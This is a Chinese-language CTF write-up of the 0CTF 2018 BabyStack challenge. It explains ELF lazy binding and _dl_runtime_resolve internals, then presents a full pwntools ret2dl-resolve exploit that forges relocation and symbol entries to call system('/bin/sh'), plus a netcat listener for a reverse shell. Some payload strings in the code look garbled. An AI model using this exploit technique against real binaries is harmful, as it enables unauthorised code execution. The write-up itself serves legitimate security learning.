# 0CTF 2018 BabyStack

阅读量 **169596**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-04-20 14:00:30

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t017041cf6522b37dfc.png)

## 前言

> `0ctf`最简单的一道`PWN`题, 用到了`ret2dl_solve`. 说来惭愧, 没做出来, 还是自己菜. 这次的讲解是假设源程序在本机下的,
> 而不是比赛的环境. 比赛的环境是真坑, 下篇给出比赛环境下的讲解.

## 源代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    int input() {
        char buf[0x1c];
        return read(0, buf, 0x40);
    }
    int main(){
        alarm(0xA);
        input();
        return 0;
    }
    //(自己意淫出来的)
    

## 程序分析

**1\. checksec**

    
    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled(不能使用Shellcode)
    PIE:      No PIE (0x8048000)
    

**2\. 查看一些系统函数**

    
    
    readelf -r ./babystack
    
    Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries:
     Offset     Info    Type            Sym.Value  Sym. Name
    0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
    0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
    0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
    

**3\. 结论**

> 程序明显存在栈溢出, 但是有没有其他的可以利用的函数.

## 知识讲解

**问题: 一个`libc`中的函数是如何被定位执行的呢?**

> 一个`PWN`手的常识:
> 在`Linux`下,函数采用[延迟绑定技术](https://blog.csdn.net/DrottningholmEast/article/details/76651279),是用到哪个函数才对哪个函数进行重定位.

**1\. 基础知识**  
一个ELF文件是有很多个`section`构成的,  

相应的数据结构:

    
    
    typedef struct {
        Elf32_Word sh_name;      // 节头部字符串表节区的索引
        Elf32_Word sh_type;      // 节类型
        Elf32_Word sh_flags;     // 节标志，用于描述属性
        Elf32_Addr sh_addr;      // 节的内存映像
        Elf32_Off  sh_offset;    // 节的文件偏移
        Elf32_Word sh_size;      // 节的长度
        Elf32_Word sh_link;      // 节头部表索引链接
        Elf32_Word sh_info;      // 附加信息
        Elf32_Word sh_addralign; // 节对齐约束
        Elf32_Word sh_entsize;   // 固定大小的节表项的长度
    } Elf32_Shdr;
    

其中`.dynsym`, `.dynstr`, `.rel.dyn`, `rel.plt`, `.plt`, `.plt.got`,
`.got`,`.got.plt`等, 这些`section`请大家注意一下, 后面要用到.

    
    
    .dynsym  --> 动态链接符号表, _dl_fixup会用到(dynamic linking symbol table)
    .dynstr    --> 动态链接字符串表, _dl_fixup会用到
    .rel.dyn   --> 变量重定位(不重点讲了)
    .rel.plt    --> 函数重定位
    .plt         --> 跳转表, 俗称PLT[0]
    .got         --> 全局变量偏移
    .got.plt    --> 保存全局函数偏移表
    

下面以`read`函数作为例子讲解整个过程:  
 **第一步**

    
    
    0x804844c:    call   0x8048300 <read@plt>        --------------------    ......                                                                                                    |
    0x8048300 <read@plt>:    jmp  DWORD PTR ds:0x804a00c <---    0x8048306 <read@plt+6>:    push  0x0 (第一次时, 上一条指令就是跳到0x8048306, 执行push 0x0.)
      (第二次、三次、四次时, 上一条跳转指令直接跳到真实的函数地址)
    0x804830b <read@plt+11>:jmp    0x80482f0    -------------    ......                                                                                           |
    0x80482f0:    push   DWORD PTR ds:0x804a004     <--------    0x80482f6:    jmp    DWORD PTR ds:0x804a008      ---------                                                      ......                                         |
    0xf7fee000 <_dl_runtime_resolve>:    push eax         <---------    0xf7fee001 <_dl_runtime_resolve+1>:    push ecx
    

从上面整个执行流程来看: 压入了`0x0(reloc_arg) 和 ds:0x804a004(link_map)`, 作为
`_dl_runtime_resolve`的参数.

_参数的由来:_

  1. reloc_arg

`readelf -r ./babystack`

![](https://p1.ssl.qhimg.com/t0191f0500e4bb290a9.png)

    
    
    0x80482b0:    0x0804a00c    0x00000107    0x0804a010    0x00000207
    0x80482c0:    0x0804a014    0x00000407    0x08ec8353    0x00009fe8
    (与上面图中的数值一致)
    

2\. link_map  
链接器的表示信息, 链接的时候就已经写入了.

**结论** : 以上过程想当于执行了`_dl_runtime_resolve(link_map, reloc_arg)`, 该函数会完成符号解析,
将真正的地址写入到`read[@got](https://github.com/got "@got")`中.

**第二步**

    
    
    0xf7fee001 <_dl_runtime_resolve+1>:    push   ecx
    0xf7fee002 <_dl_runtime_resolve+2>:    push   edx
    0xf7fee003 <_dl_runtime_resolve+3>:    mov    edx,DWORD PTR [esp+0x10]
    0xf7fee007 <_dl_runtime_resolve+7>:    mov    eax,DWORD || PTR [esp+0xc]
    0xf7fee00b <_dl_runtime_resolve+11>:call   0xf7fe77e0 <_dl_fixup>
    ......
    

可以看到`_dl_runtime_resolve`中又调用了`_dl_fixup`

    
    
    (部分_dl_fixup源码)
    _dl_fixup(struct link_map *l, ElfW(Word) reloc_arg){
      //首先通过参数reloca_arg计算入口地址, DT_JMPREL即.rel.plt, reloc_offset 就是 reloc_arg
      const PLTREL *const reloc
      = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
      // 通过reloc->r_info(0x107) 找到.dynsym中对应的条目
       const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
      // 检查reloc->r_info的最低位是否为0x7, 不是则退出
      assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
      //接着到strtab + sym->st_name中找到符号字符串, result为libc的基地址
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                      version, ELF_RTYPE_CLASS_PLT, flags, NULL);
    // value 就是目标函数相对与libc基地址的偏移地址
    value = DL_FIXUP_MAKE_VALUE (result,
                                    sym ? (LOOKUP_VALUE_ADDRESS (result)
                                           + sym->st_value) : 0);
    // 写入指定的.got表
    return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);                                       
    }
    

> 有童鞋可能有疑问: `_dl_fix`前面有`push 指令`, 为什么`_dl_fixup`和  
> `_dl_runtime_resolve`的参数一样都是`reloc_arg, link_map`呢?

  
_小结论:_ `_dl_fixup` 最终会通过函数名来查找函数对应的地址, 因此函数名是不可能重复的.

**第三步**  
下面实地带大家找一下`read`函数的字符串, 按照`_dl_fixup`.

    
    
    .rel.plt = 0x080482b0, reloc_arg = 0
    
    typedef struct {
        Elf32_Addr r_offset;    // 对于可执行文件，此值为虚拟地址
        Elf32_Word r_info;      // 符号表索引
    } Elf32_Rel;
    
                             ---------------------------------------    0x80482b0:    |0x0804a00c    0x00000107|    0x0804a010    0x00000207
                              --------------------------------------    0x80482c0:    0x0804a014    0x00000407
    reloc-> info = 0x107; reloc-> r_offset = 0x0804a00c
    

接着

    
    
    const ElfW(Sym) *sym = (Elf32_Rel->r_info) >> 8 = 0x1
    

![](https://p3.ssl.qhimg.com/t01332431083108728b.png)

**第四步**  
`_dl_runtime_resolve`将控制权交给目标函数

## _ret2ret2dl_solve攻击利用

**整体思路:** 从上面知识讲解可以看出来, 给`_dl_runtime_resolve`传进去了两个参数, 我们就是要控制这两个参数,
让系统最终来查找我们自己构造的函数名, 最终实现执行`system("/bin/sh")`

**步骤1: 劫持执行流**  
由于一次输入最多`0x40`个字符, 所以我们需要分两次输入

    
    
    offset = 44
    payload  = "A"*44
    payload += p32(0x804843b) #0x804843b 是读取调用读取函数的地址
    payload += p32(ppp_ret)   #pop esi ; pop edi ; pop ebp ; ret
    payload += p32(0)
    payload += p32(bss_stage) # 地址, 存放我们输入的内容, .bss最适合
    payload += p32(100)
    

**步骤2: 输入构造内容**  
这是`_ret2dl_solve`最复杂的部分, 大家要细细理解

    
    
    cmd = "/bin/sh"
    plt_0 = 0x080482f0    # .plt
    ret_plt = 0x080482b0  #.ret.plt --> 及时readelf -r ./babystack显示出的内容
    
    index_offset = (base_stage + 28) - ret_plt #index_offset 会和 rel_plt相加
    dynsym = 0x080481cc   #.dynsym
    dynstr = 0x0804822c   # .dynstr
    
    # 保证程序能够正确的解释执行我们构造的内容
    # --------------------------------------------------    fake_sym_addr = base_stage + 36
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr = fake_sym_addr + align
    index_dynsym = (fake_sym_addr - dynsym) / 0x10
    r_info = (index_dynsym << 8) | 0x7
    fake_reloc = p32(read_got) + p32(r_info)
    st_name = (fake_sym_addr + 16) - dynstr
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
    # -----------------------------------------------------    
    payload  = 'AAAA'
    payload += p32(plt_0)
    payload += p32(index_offset)
    payload += 'AAAA'
    payload += p32(base_stage + 80)
    payload += 'a' * 8
    payload += fake_reloc
    payload += align * "B"
    payload += fake_sym
    payload += "systemx00"
    payload += "A" * (80 - len(payload2))
    payload += cmd + 'x00'
    payload += "A"*(100 - len(payload2))
    p.send(payload2)
    

**步骤3: 第二次劫持执行流**  
第一次劫持是为了让程序输入, 第二次劫持是为了使其跳转到我们精心构造的内容

    
    
    payload  = 'A' * (offset)
    payload += p32(pop_ebp_ret)
    payload += p32(base_stage)
    payload += p32(leave_ret)  #mov esp, ebp; pop ebp; ret
    

**步骤４: 这还不算完(功能未完成)**  
由于比赛做了一些特殊设置, 需要我们使用反弹`shell`才行．这就要我们使用一台有公网`ip`的服务器．  
首先服务器上监听端口：

    
    
    nc -l -p 8888 -vvv
    

执行EXP, 反弹shell至远程服务器, `then cat flag`

## 完整EXP(只能本地，远程未完成)

    
    
    from pwn import *
    
    context.log_level = 'debug'
    
    elf = ELF('./babystack')
    
    offset = 44
    read_plt = elf.plt['read']
    read_got = elf.got['read']
    
    ppp_ret = 0x080484e9
    pop_ebp_ret = 0x080484eb
    leave_ret = 0x080483a8
    
    stack_size = 0x400
    bss_addr = 0x0804a020
    base_stage = bss_addr + stack_size
    
    p = process('./babystack')
    # gdb.attach(p)
    
    payload  = 'A' * offset
    payload += p32(read_plt)
    payload += p32(0x804843B)
    payload += p32(0)
    payload += p32(base_stage)
    payload += p32(200)
    p.send(payload)
    
    
    
    cmd = '/bin/sh'
    plt_0 = 0x080482f0
    ret_plt = 0x080482b0
    
    index_offset = (base_stage + 28) - ret_plt
    dynsym = 0x080481cc
    dynstr = 0x0804822c
    
    fake_sym_addr = base_stage + 36
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr = fake_sym_addr + align
    index_dynsym = (fake_sym_addr - dynsym) / 0x10
    r_info = (index_dynsym << 8) | 0x7
    fake_reloc = p32(read_got) + p32(r_info)
    st_name = (fake_sym_addr + 16) - dynstr
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
    
    payload = 'AAAA'
    payload += p32(plt_0)
    payload += p32(index_offset)
    payload += 'AAAA'
    payload += p32(base_stage + 80)
    payload += 'a' * 8
    payload += fake_reloc
    payload += align * "B"
    payload += fake_sym
    payload += "systemx00"
    payload += "A" * (80 - len(payload))
    payload += cmd + 'x00'
    payload += "A"*(200 - len(payload))
    p.send(payload)
    
    
    payload  = 'A' * (offset)
    payload += p32(pop_ebp_ret)
    payload += p32(base_stage)
    payload += p32(leave_ret)  #mov esp, ebp; pop ebp; ret
    p.send(payload)
    
    p.interactive()
    

## 总结

**_ret2dl_solve** 攻击方式利用起来不是很困难, 只需改几个参数就可以, 但是完全理解还是需要花点功夫的.

## 参考链接

[XDCTF2015](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)  
[_dl_runtime_resolve源码](https://code.woboq.org/userspace/glibc/sysdeps/i386/dl-trampoline.S.html)  
[EXP(远程可以用)](http://blog.plusls.cn/ctf/0ctf-2018/pwn/babystack/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Bill** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/103736](/post/id/103736)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __1赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) Bill

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

